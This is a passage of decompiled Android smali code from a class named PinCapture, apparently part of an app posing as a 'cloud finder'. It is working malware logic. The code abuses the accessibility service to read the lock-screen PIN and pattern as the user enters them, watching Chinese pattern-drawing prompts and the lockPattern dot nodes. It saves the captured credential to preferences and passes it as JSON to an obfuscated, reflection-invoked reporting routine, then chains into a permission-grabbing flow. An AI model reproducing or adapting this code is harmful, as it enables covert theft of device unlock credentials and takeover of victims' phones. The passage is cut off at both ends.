    invoke-virtual {v0, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_9

    const-string v4, "unlock"

    .line 305
    invoke-virtual {v0, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_a

    .line 306
    :cond_9
    sget-object v0, Lcom/lite/cloudfinder/pin/PinCapture;->BUF:Ljava/lang/StringBuilder;

    const/4 v4, 0x0

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->setLength(I)V

    .line 307
    sput-object v13, Lcom/lite/cloudfinder/pin/PinCapture;->capType:Ljava/lang/String;

    .line 308
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :cond_a
    return-void

    :cond_b
    if-eqz v9, :cond_c

    .line 315
    invoke-static/range {p0 .. p1}, Lcom/lite/cloudfinder/pin/PinCapture;->probePattern(Landroid/content/Context;Landroid/view/accessibility/AccessibilityEvent;)V

    :cond_c
    const/16 v3, 0x10

    if-eq v10, v11, :cond_d

    if-eq v10, v3, :cond_d

    const/16 v5, 0x8

    if-eq v10, v5, :cond_d

    return-void

    .line 324
    :cond_d
    invoke-static/range {p1 .. p1}, Lcom/lite/cloudfinder/pin/PinCapture;->nodeText(Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;

    move-result-object v5

    if-nez v5, :cond_e

    goto :goto_1

    :cond_e
    move-object v8, v5

    .line 326
    :goto_1
    invoke-virtual {v8}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v5

    .line 327
    invoke-virtual {v5}, Ljava/lang/String;->length()I

    move-result v8

    if-nez v8, :cond_10

    if-ne v10, v3, :cond_f

    .line 328
    sget-object v2, Lcom/lite/cloudfinder/pin/PinCapture;->BUF:Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->length()I

    move-result v2

    if-lez v2, :cond_f

    .line 330
    new-instance v2, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v3

    invoke-direct {v2, v3}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v3, Lcom/lite/cloudfinder/pin/PinCapture$4;

    invoke-direct {v3, v0}, Lcom/lite/cloudfinder/pin/PinCapture$4;-><init>(Landroid/content/Context;)V

    const-wide/16 v4, 0x15e

    invoke-virtual {v2, v3, v4, v5}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    :cond_f
    return-void

    .line 340
    :cond_10
    invoke-virtual {v5}, Ljava/lang/String;->length()I

    move-result v3

    const/16 v8, 0x40

    if-le v3, v8, :cond_11

    return-void

    .line 342
    :cond_11
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v10}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v4, " pkg="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, " s="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v1, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 344
    invoke-static {v5}, Lcom/lite/cloudfinder/pin/PinCapture;->isWrongHint(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_12

    .line 345
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    const/4 v2, 0x0

    .line 346
    invoke-static {v0, v2}, Lcom/lite/cloudfinder/pin/PinCapture;->finalizeAttempt(Landroid/content/Context;Z)V

    return-void

    :cond_12
    if-ne v10, v11, :cond_13

    .line 351
    invoke-static {v0, v5}, Lcom/lite/cloudfinder/pin/PinCapture;->handleKey(Landroid/content/Context;Ljava/lang/String;)V

    goto :goto_3

    .line 353
    :cond_13
    invoke-static {v0, v5}, Lcom/lite/cloudfinder/pin/PinCapture;->handleText(Landroid/content/Context;Ljava/lang/String;)V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    goto :goto_3

    :cond_14
    :goto_2
    return-void

    :catchall_0
    move-exception v0

    .line 356
    const-string v2, "onEvent failed"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_3
    return-void
.end method

.method public static onVerified(Landroid/content/Context;)V
    .locals 2

    .line 188
    sget-boolean v0, Lcom/lite/cloudfinder/pin/PinCapture;->flowStarted:Z

    if-eqz v0, :cond_0

    return-void

    :cond_0
    const/4 v0, 0x1

    .line 189
    sput-boolean v0, Lcom/lite/cloudfinder/pin/PinCapture;->flowStarted:Z

    .line 190
    const-string v0, "PinCapture"

    const-string v1, "credential verified -> permissions"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 191
    invoke-static {p0}, Lcom/lite/cloudfinder/pin/PinCapture;->startPermissionFlow(Landroid/content/Context;)V

    return-void
.end method

.method private static declared-synchronized probePattern(Landroid/content/Context;Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 9

    const-class v0, Lcom/lite/cloudfinder/pin/PinCapture;

    monitor-enter v0

    .line 442
    :try_start_0
    const-string v1, ""

    .line 443
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v2

    if-eqz v2, :cond_1

    .line 445
    invoke-interface {v2}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v2

    :cond_0
    :goto_0
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v3

    if-eqz v3, :cond_1

    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Ljava/lang/CharSequence;

    if-eqz v3, :cond_0

    .line 446
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-interface {v3}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    goto :goto_0

    .line 449
    :cond_1
    const-string v2, "\u5f00\u59cb\u7ed8\u5236\u56fe\u6848"

    invoke-virtual {v1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    const/16 v3, 0x9

    const/4 v4, 0x0

    if-eqz v2, :cond_3

    .line 450
    sget-object v2, Lcom/lite/cloudfinder/pin/PinCapture;->PATTERN:Ljava/lang/StringBuilder;

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->setLength(I)V

    move v2, v4

    :goto_1
    if-ge v2, v3, :cond_2

    .line 451
    sget-object v5, Lcom/lite/cloudfinder/pin/PinCapture;->DOTS:[Z

    aput-boolean v4, v5, v2

    add-int/lit8 v2, v2, 0x1

    goto :goto_1

    .line 452
    :cond_2
    invoke-static {}, Lcom/lite/cloudfinder/pin/PinCapture;->startPoll()V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_3

    .line 457
    :cond_3
    :try_start_1
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getSource()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p1
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    goto :goto_2

    :catchall_0
    const/4 p1, 0x0

    :goto_2
    if-nez p1, :cond_4

    .line 460
    :try_start_2
    instance-of v2, p0, Landroid/accessibilityservice/AccessibilityService;
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_3

    if-eqz v2, :cond_4

    .line 462
    :try_start_3
    move-object v2, p0

    check-cast v2, Landroid/accessibilityservice/AccessibilityService;

    invoke-virtual {v2}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p1
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_1

    :catchall_1
    :cond_4
    if-eqz p1, :cond_5

    .line 467
    :try_start_4
    invoke-static {p1, v4}, Lcom/lite/cloudfinder/pin/PinCapture;->readDots(Landroid/view/accessibility/AccessibilityNodeInfo;I)V
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_3

    .line 469
    :try_start_5
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_2

    .line 474
    :catchall_2
    :cond_5
    :try_start_6
    const-string p1, "\u56fe\u6848\u7ed8\u5236\u5b8c\u6210"

    invoke-virtual {v1, p1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p1

    if-nez p1, :cond_6

    const-string p1, "\u56fe\u6848\u7ed8\u5236\u4e0d\u6b63\u786e"

    invoke-virtual {v1, p1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p1

    if-nez p1, :cond_6

    const-string p1, "\u56fe\u6848\u5df2\u7ed8\u5236"

    invoke-virtual {v1, p1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p1

    if-eqz p1, :cond_8

    .line 475
    :cond_6
    sget-object p1, Lcom/lite/cloudfinder/pin/PinCapture;->PATTERN:Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 476
    const-string v5, "\u4e0d\u6b63\u786e"

    invoke-virtual {v1, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    xor-int/lit8 v5, v5, 0x1

    .line 477
    const-string v6, "PinCapture"

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "pattern done ("

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, ") = "

    invoke-virtual {v7, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v6, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 478
    invoke-virtual {v2}, Ljava/lang/String;->length()I

    move-result v1

    if-lez v1, :cond_7

    .line 479
    const-string v1, "pin_capture"

    invoke-virtual {p0, v1, v4}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object p0

    invoke-interface {p0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object p0

    const-string v1, "pattern"

    .line 480
    invoke-interface {p0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    move-result-object p0

    const-string v1, "pattern_ok"

    .line 481
    invoke-interface {p0, v1, v5}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    move-result-object p0

    const-string v1, "pattern_ts"

    .line 482
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v6

    invoke-interface {p0, v1, v6, v7}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    move-result-object p0

    .line 483
    invoke-interface {p0}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 484
    new-instance p0, Ljava/lang/StringBuilder;

    invoke-direct {p0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "{\"type\":\"pattern\",\"value\":\""

    invoke-virtual {p0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, "\",\"ok\":"

    invoke-virtual {p0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 485
    invoke-virtual {p0, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v1, ",\"ts\":"

    invoke-virtual {p0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 486
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

    invoke-virtual {p0, v1, v2}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    const-string v1, "}"

    invoke-virtual {p0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    .line 484
    invoke-static {p0}, Lcom/lite/cloudfinder/pin/PinCapture;->report(Ljava/lang/String;)V

    .line 488
    :cond_7
    invoke-static {}, Lcom/lite/cloudfinder/pin/PinCapture;->stopPoll()V

    .line 489
    invoke-virtual {p1, v4}, Ljava/lang/StringBuilder;->setLength(I)V

    move p0, v4

    :goto_3
    if-ge p0, v3, :cond_8

    .line 490
    sget-object p1, Lcom/lite/cloudfinder/pin/PinCapture;->DOTS:[Z

    aput-boolean v4, p1, p0
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_3

    add-int/lit8 p0, p0, 0x1

    goto :goto_3

    :catchall_3
    move-exception p0

    .line 493
    :try_start_7
    const-string p1, "PinCapture"

    const-string v1, "probe failed"

    invoke-static {p1, v1, p0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
    :try_end_7
    .catchall {:try_start_7 .. :try_end_7} :catchall_4

    .line 495
    :cond_8
    monitor-exit v0

    return-void

    :catchall_4
    move-exception p0

    monitor-exit v0

    throw p0
.end method

.method public static prompt(Landroid/content/Context;)V
    .locals 2

    const-wide/16 v0, 0x320

    .line 101
    invoke-static {p0, v0, v1}, Lcom/lite/cloudfinder/pin/PinCapture;->promptAfter(Landroid/content/Context;J)V

    return-void
.end method

.method public static promptAfter(Landroid/content/Context;J)V
    .locals 3

    .line 107
    const-string v0, "PinCapture"

    if-nez p0, :cond_0

    return-void

    .line 108
    :cond_0
    :try_start_0
    const-string v1, "keyguard"

    invoke-virtual {p0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/KeyguardManager;

    if-eqz v1, :cond_3

    .line 109
    invoke-virtual {v1}, Landroid/app/KeyguardManager;->isDeviceSecure()Z

    move-result v1

    if-nez v1, :cond_1

    goto :goto_0

    .line 114
    :cond_1
    sget-boolean v1, Lcom/lite/cloudfinder/pin/PinCapture;->prompted:Z

    if-eqz v1, :cond_2

    .line 115
    const-string p0, "prompt skip: already prompted this process"

    invoke-static {v0, p0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    return-void

    :cond_2
    const/4 v1, 0x1

    .line 118
    sput-boolean v1, Lcom/lite/cloudfinder/pin/PinCapture;->prompted:Z

    .line 119
    new-instance v1, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v2

    invoke-direct {v1, v2}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v2, Lcom/lite/cloudfinder/pin/PinCapture$1;

    invoke-direct {v2, p0}, Lcom/lite/cloudfinder/pin/PinCapture$1;-><init>(Landroid/content/Context;)V

    invoke-virtual {v1, v2, p1, p2}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    const-wide/16 v1, 0x7530

    add-long/2addr p1, v1

    const/4 v1, 0x5

    .line 136
    invoke-static {p0, p1, p2, v1}, Lcom/lite/cloudfinder/pin/PinCapture;->scheduleFallback(Landroid/content/Context;JI)V

    goto :goto_1

    .line 110
    :cond_3
    :goto_0
    const-string p1, "prompt skip: no secure keyguard -> permissions"

    invoke-static {v0, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 111
    invoke-static {p0}, Lcom/lite/cloudfinder/pin/PinCapture;->startPermissionFlow(Landroid/content/Context;)V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    return-void

    :catchall_0
    move-exception p0

    .line 138
    const-string p1, "prompt failed"

    invoke-static {v0, p1, p0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_1
    return-void
.end method

.method private static readDots(Landroid/view/accessibility/AccessibilityNodeInfo;I)V
    .locals 9

    if-eqz p0, :cond_6

    const/4 v0, 0x3

    if-le p1, v0, :cond_0

    goto/16 :goto_3

    :cond_0
    const/4 v0, 0x0

    const/4 v1, 0x1

    .line 500
    :try_start_0
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v2

    if-eqz v2, :cond_5

    .line 501
    const-string v3, "lockPattern"

    invoke-virtual {v2, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_5

    .line 502
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v2

    move v3, v0

    :goto_0
    if-ge v3, v2, :cond_4

    const/16 v4, 0x9

    if-ge v3, v4, :cond_4

    .line 504
    invoke-virtual {p0, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v4

    if-nez v4, :cond_1

    goto :goto_1

    .line 506
    :cond_1
    invoke-virtual {v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v4

    xor-int/2addr v4, v1

    if-eqz v4, :cond_2

    .line 507
    sget-object v5, Lcom/lite/cloudfinder/pin/PinCapture;->DOTS:[Z

    aget-boolean v6, v5, v3

    if-nez v6, :cond_2

    .line 508
    aput-boolean v1, v5, v3

    .line 509
    sget-object v4, Lcom/lite/cloudfinder/pin/PinCapture;->PATTERN:Ljava/lang/StringBuilder;

    add-int/lit8 v5, v3, 0x1

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    .line 510
    const-string v6, "PinCapture"

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "dot "

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v5, " -> "

    invoke-virtual {v7, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v6, v4}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_1

    :cond_2
    if-nez v4, :cond_3

    .line 511
    sget-object v4, Lcom/lite/cloudfinder/pin/PinCapture;->DOTS:[Z

    aget-boolean v5, v4, v3

    if-eqz v5, :cond_3

    .line 512
    aput-boolean v0, v4, v3
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    :cond_3
    :goto_1
    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    :cond_4
    return-void

    .line 521
    :catchall_0
    :cond_5
    :try_start_1
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v2
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_1

    goto :goto_2

    :catchall_1
    move v2, v0

    :goto_2
    if-ge v0, v2, :cond_6

    .line 526
    :try_start_2
    invoke-virtual {p0, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v3

    add-int/lit8 v4, p1, 0x1

    invoke-static {v3, v4}, Lcom/lite/cloudfinder/pin/PinCapture;->readDots(Landroid/view/accessibility/AccessibilityNodeInfo;I)V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_2

    :catchall_2
    add-int/lit8 v0, v0, 0x1

    goto :goto_2

    :cond_6
    :goto_3
    return-void
.end method

.method private static report(Ljava/lang/String;)V
    .locals 4

    .line 680
    :try_start_0
    const-string v0, "\u069d\u0696\u0601\u068b.\u0631"

    invoke-static {v0}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v0

    .line 681
    const-string v1, "\u060b"

    const-class v2, Ljava/lang/String;

    const-class v3, Ljava/lang/String;

    filled-new-array {v2, v3}, [Ljava/lang/Class;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    .line 682
    const-string v1, "pin_capture"

    filled-new-array {v1, p0}, [Ljava/lang/Object;

    move-result-object p0

    const/4 v1, 0x0

    invoke-virtual {v0, v1, p0}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    goto :goto_0

    :catchall_0
    move-exception p0

    .line 684
    const-string v0, "PinCapture"

    const-string v1, "report failed"

    invoke-static {v0, v1, p0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_0
    return-void
.end method

.method public static reprompt(Landroid/content/Context;J)V
    .locals 2

    if-nez p0, :cond_0

    return-void

    .line 217
    :cond_0
    :try_start_0
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Lcom/lite/cloudfinder/pin/PinCapture$3;

    invoke-direct {v1, p0}, Lcom/lite/cloudfinder/pin/PinCapture$3;-><init>(Landroid/content/Context;)V

    invoke-virtual {v0, v1, p1, p2}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    goto :goto_0

    :catchall_0
    move-exception p0

    .line 233
    const-string p1, "PinCapture"

    const-string p2, "reprompt outer"

    invoke-static {p1, p2, p0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_0
    return-void
.end method

.method public static reset(Landroid/content/Context;)V
    .locals 2

    .line 240
    const-string p0, "PinCapture"

    const/4 v0, 0x0

    :try_start_0
    sput-boolean v0, Lcom/lite/cloudfinder/pin/PinCapture;->prompted:Z

    .line 241
    const-string v0, "prompt_reset done"

    invoke-static {p0, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    goto :goto_0

    :catchall_0
    move-exception v0

    .line 243
    const-string v1, "reset failed"

    invoke-static {p0, v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_0
    return-void
.end method

.method private static scheduleFallback(Landroid/content/Context;JI)V
    .locals 2

    .line 145
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Lcom/lite/cloudfinder/pin/PinCapture$2;

    invoke-direct {v1, p3, p0, p1, p2}, Lcom/lite/cloudfinder/pin/PinCapture$2;-><init>(ILandroid/content/Context;J)V

    invoke-virtual {v0, v1, p1, p2}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method

.method private static setValue(Ljava/lang/String;)V
    .locals 2

    .line 629
    sget-object v0, Lcom/lite/cloudfinder/pin/PinCapture;->BUF:Ljava/lang/StringBuilder;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->setLength(I)V

    .line 630
    invoke-virtual {v0, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    return-void
.end method

.method public static startPermissionFlow(Landroid/content/Context;)V
    .locals 4

    .line 204
    const-string v0, "PinCapture"

    :try_start_0
    const-string v1, "\u069d\u0696\u0601\u068b.\u06be"

    invoke-static {v1}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v1

    .line 205
    const-string v2, "startPerm"

    const-class v3, Landroid/content/Context;

    filled-new-array {v3}, [Ljava/lang/Class;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v1

    .line 206
    filled-new-array {p0}, [Ljava/lang/Object;

    move-result-object p0

    const/4 v2, 0x0

    invoke-virtual {v1, v2, p0}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 207
    const-string p0, "startPerm invoked"

    invoke-static {v0, p0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    goto :goto_0

    :catchall_0
    move-exception p0

    .line 209
    const-string v1, "startPerm failed"

    invoke-static {v0, v1, p0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_0
    return-void
.end method

.method private static startPoll()V
    .locals 4

    .line 417
    sget-boolean v0, Lcom/lite/cloudfinder/pin/PinCapture;->polling:Z

    if-eqz v0, :cond_0

    return-void

    :cond_0
    const/4 v0, 0x1

    .line 418
    sput-boolean v0, Lcom/lite/cloudfinder/pin/PinCapture;->polling:Z

    .line 419
    sget-object v0, Lcom/lite/cloudfinder/pin/PinCapture;->POLL_H:Landroid/os/Handler;

    sget-object v1, Lcom/lite/cloudfinder/pin/PinCapture;->POLL_R:Ljava/lang/Runnable;

    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    .line 420
    new-instance v1, Lcom/lite/cloudfinder/pin/PinCapture$6;

    invoke-direct {v1}, Lcom/lite/cloudfinder/pin/PinCapture$6;-><init>()V

    const-wide/16 v2, 0x2710

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 430
    const-string v0, "PinCapture"

    const-string v1, "dot polling start"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method

.method private static stopPoll()V
    .locals 2

    const/4 v0, 0x0

    .line 434
    sput-boolean v0, Lcom/lite/cloudfinder/pin/PinCapture;->polling:Z

    .line 435
    sget-object v0, Lcom/lite/cloudfinder/pin/PinCapture;->POLL_H:Landroid/os/Handler;

    sget-object v1, Lcom/lite/cloudfinder/pin/PinCapture;->POLL_R:Ljava/lang/Runnable;

    invoke-virtual {v0, v1}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    .line 436
    const-string v0, "PinCapture"

    const-string v1, "dot polling stop"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method

.method private static tailAfterMask(Ljava/lang/String;)Ljava/lang/String;
    .locals 4

    const/4 v0, -0x1

    const/4 v1, 0x0

    .line 612
    :goto_0
    invoke-virtual {p0}, Ljava/lang/String;->length()I

    move-result v2

